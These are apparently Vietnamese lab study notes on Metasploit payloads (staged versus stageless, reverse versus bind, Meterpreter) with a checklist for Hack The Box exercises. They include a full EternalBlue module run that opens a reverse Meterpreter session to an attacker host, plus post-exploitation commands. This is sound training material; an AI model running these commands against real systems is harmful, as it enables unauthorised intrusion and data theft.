# Metasploit Payloads

## Khái niệm

```text
Exploit = tạo khả năng thực thi code
Payload = code chạy sau khi exploit thành công
```

Payload có thể tạo shell, Meterpreter, chạy command, nạp DLL hoặc mở VNC.

## Payload Types

### Single / Stageless

Payload hoàn chỉnh được gửi một lần.

```text
windows/x64/shell_reverse_tcp
windows/x64/meterpreter_reverse_tcp
```

Ưu điểm:

- Không cần tải stage sau.
    
- Ít phụ thuộc vào staging connection.
    
- Thường đơn giản và ổn định.
    

Nhược điểm:

- Kích thước lớn.
    
- Có thể không vừa payload space của exploit.
    
### Stager

Đoạn code nhỏ chạy trước để tạo kênh truyền và tải stage.

Ví dụ:

```text
reverse_tcp
reverse_https
bind_tcp
```

### Stage

Payload lớn được tải sau khi stager kết nối thành công.

Ví dụ:

```text
meterpreter
shell
vncinject
```

## Nhận biết staged và stageless

Staged:

```text
windows/x64/meterpreter/reverse_tcp
windows/x64/shell/reverse_tcp
```

Stageless:

```text
windows/x64/meterpreter_reverse_tcp
windows/x64/shell_reverse_tcp
```

```text
Có `/` giữa chức năng và transport → staged
Dùng `_` → stageless/single
```

## Staged Payload Flow

```text
Exploit
  ↓
Stager chạy trên target
  ↓
Target kết nối về handler
  ↓
Handler gửi stage
  ↓
Stage chạy trong memory
  ↓
Session được tạo
```

## Reverse vs Bind

Reverse:

```text
Target → Attack box
```

Bind:

```text
Attack box → Target listening port
```

Reverse thường phù hợp hơn khi inbound filtering chặt, nhưng vẫn có thể bị outbound firewall hoặc EDR chặn.

## Meterpreter

Meterpreter là payload tương tác nâng cao.

Các lệnh phổ biến:

```text
help
getuid
sysinfo
pwd
ls
cat
search
ps
shell
background
sessions
```

Meterpreter không phải CMD hoặc PowerShell.

```text
meterpreter > getuid
```

Để mở CMD:

```text
meterpreter > shell
C:\> whoami
```

Meterpreter có thể chạy in-memory nhưng vẫn để lại network, memory, log và EDR artifacts. Session thông thường không tự persistent qua reboot.

## Tìm Payload

```text
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads
```

## Chọn Payload

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Ưu tiên dùng tên đầy đủ thay vì index vì index có thể thay đổi.

## Exploit Options

```text
set RHOSTS <TARGET_IP>
set RPORT <TARGET_PORT>
```

## Reverse Payload Options

```text
set LHOST <ATTACKER_IP>
set LPORT <LISTENER_PORT>
```

Trong HTB:

```bash
ip -br addr show tun0
```

## Example

```text
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.10.10.40
set RPORT 445
set LHOST 10.10.14.15
set LPORT 4444
show options
check
run
```

Output quan trọng:

```text
Started reverse TCP handler
Sending stage
Meterpreter session opened
```

## Ghi nhớ

- Payload phải phù hợp OS và architecture.
    
- Stager chạy trên target; handler chạy trên attacker.
    
- Exploit thành công chưa đủ nếu payload không callback được.
    
- Payload staged có thể thất bại ở bước tải stage.
    
- Meterpreter prompt sử dụng lệnh riêng, không phải lệnh CMD.

---
# Checklist làm lab

## A. Hiểu mục tiêu

- [ ]  Bài yêu cầu command shell hay Meterpreter?
- [ ]  Cần tương tác lâu dài hay chỉ chạy một command?
- [ ]  Target là Windows, Linux hay nền tảng khác?
- [ ]  Target là x86 hay x64?
- [ ]  Target có thể kết nối ngược về attack box không?
- [ ]  Network có chặn outbound port không?

---

## B. Chọn exploit trước

- [ ]  Chọn đúng exploit:

```
use <exploit_module>
```

- [ ]  Chạy:

```
info
show options
show targets
```

- [ ]  Kiểm tra architecture của exploit.
- [ ]  Kiểm tra payload space.
- [ ]  Kiểm tra exploit hỗ trợ payload nào.

---

## C. Xem payload tương thích

- [ ]  Chạy trong exploit context:

```
show payloads
```

- [ ]  Lọc theo Meterpreter:

```
grep meterpreter show payloads
```

- [ ]  Lọc theo reverse TCP:

```
grep meterpreter grep reverse_tcp show payloads
```

- [ ]  Phân biệt staged và stageless.
- [ ]  Không chọn payload x86 cho target x64 nếu exploit yêu cầu x64.
- [ ]  Không chọn payload Windows cho target Linux.

---

## D. Chọn staged hay stageless

### Chọn staged khi:

- [ ]  Exploit có payload space nhỏ.
- [ ]  Cần stage lớn như Meterpreter.
- [ ]  Network cho phép tải stage tiếp theo.
- [ ]  Handler có thể gửi stage ổn định.

### Chọn stageless khi:

- [ ]  Muốn gửi payload một lần.
- [ ]  Network có thể chặn bước staging.
- [ ]  Exploit hỗ trợ payload lớn.
- [ ]  Cần giảm dependency vào kết nối thứ hai.

---

## E. Cấu hình target

- [ ]  Đặt IP target:

```
set RHOSTS <TARGET_IP>
```

- [ ]  Xác minh port:

```
set RPORT <SERVICE_PORT>
```

- [ ]  Kiểm tra không dùng nhầm target cũ từ `setg`.
- [ ]  Xác minh target thuộc scope.

---

## F. Cấu hình callback

- [ ]  Kiểm tra interface:

```
ip -br addr
```

- [ ]  Trong HTB kiểm tra:

```
ip -br addr show tun0
```

- [ ]  Đặt:

```
set LHOST <TUN0_IP>
set LPORT 4444
```

- [ ]  Không đặt `LHOST` thành IP target.
- [ ]  Kiểm tra `LPORT` chưa bị chiếm.
- [ ]  Kiểm tra target route được đến `LHOST`.

---

## G. Kiểm tra trước khi chạy

- [ ]  Chạy:

```
show options
```

- [ ]  Xác nhận `RHOSTS`.
- [ ]  Xác nhận `RPORT`.
- [ ]  Xác nhận payload.
- [ ]  Xác nhận `LHOST`.
- [ ]  Xác nhận `LPORT`.
- [ ]  Xác nhận target profile.
- [ ]  Chạy `check` nếu hỗ trợ.

---

## H. Đọc output khi exploit

- [ ]  Có dòng `Started reverse TCP handler` không?
- [ ]  Exploit có xác nhận target phù hợp không?
- [ ]  Có dòng `Sending stage` không?
- [ ]  Stage có được gửi hết không?
- [ ]  Có session được mở không?
- [ ]  Nếu exploit thành công nhưng không có session, kiểm tra callback.

---

## I. Sau khi có Meterpreter

- [ ]  Xem trợ giúp:

```
help
```

- [ ]  Kiểm tra user:

```
getuid
```

- [ ]  Kiểm tra target:

```
sysinfo
```

- [ ]  Xem thư mục:

```
pwd
ls
```

- [ ]  Đọc file:

```
cat <path>
```

- [ ]  Tìm file:

```
search -f <filename>
```

- [ ]  Mở Windows CMD nếu cần:

```
shell
```

- [ ]  Quay lại Meterpreter bằng cách thoát shell:

```
exit
```

- [ ]  Background session:

```
background
```

---

## J. Khi không nhận được session

- [ ]  `LHOST` có đúng IP `tun0` không?
- [ ]  Target có thể route về attack box không?
- [ ]  `LPORT` có bị firewall chặn không?
- [ ]  Payload có đúng architecture không?
- [ ]  Payload có tương thích exploit không?
- [ ]  Stage có bị AV/EDR chặn không?
- [ ]  Thử port hợp lệ khác trong phạm vi lab.
- [ ]  Cân nhắc stageless payload.
- [ ]  Kiểm tra VPN.
- [ ]  Không chạy exploit liên tục nếu có nguy cơ crash target.

9.4.12.v20180830